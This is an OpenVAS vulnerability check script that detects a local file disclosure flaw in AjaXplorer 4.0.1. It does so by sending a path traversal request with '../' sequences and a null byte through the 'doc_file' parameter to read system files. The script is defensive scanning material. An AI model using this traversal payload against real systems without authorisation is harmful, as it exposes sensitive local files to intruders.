###############################################################################
# OpenVAS Vulnerability Test
#
# AjaXplorer 'doc_file' Parameter Local File Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103422");
  script_bugtraq_id(51960);
  script_version("2020-05-08T08:34:44+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_name("AjaXplorer 'doc_file' Parameter Local File Disclosure Vulnerability");
  script_tag(name:"last_modification", value:"2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)");
  script_tag(name:"creation_date", value:"2012-02-15 12:40:42 +0100 (Wed, 15 Feb 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_AjaXplorer_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("AjaXplorer/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51960");
  script_xref(name:"URL", value:"http://ajaxplorer.info/ajaxplorer-4-0-2/");
  script_xref(name:"URL", value:"http://www.ajaxplorer.info");

  script_tag(name:"impact", value:"Exploiting this vulnerability would allow an attacker to obtain
  potentially sensitive information from local text files on computers
  running the vulnerable application. This may aid in further attacks.");
  script_tag(name:"affected", value:"AjaXplorer 4.0.1 is vulnerable, other versions are also affected.");
  script_tag(name:"solution", value:"Updates are available. Please see the references for more details.");
  script_tag(name:"summary", value:"AjaXplorer is prone to a local file-disclosure vulnerability because
  it fails to adequately validate user-supplied input.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

CPE = 'cpe:/a:ajaxplorer:ajaxplorer';

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach file( keys( files ) ) {

  if( dir == "/" ) dir = "";

  url = string(dir, "/index.php?get_action=display_doc&doc_file=",crap(data:"../",length:6*9),files[file],"%00");

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
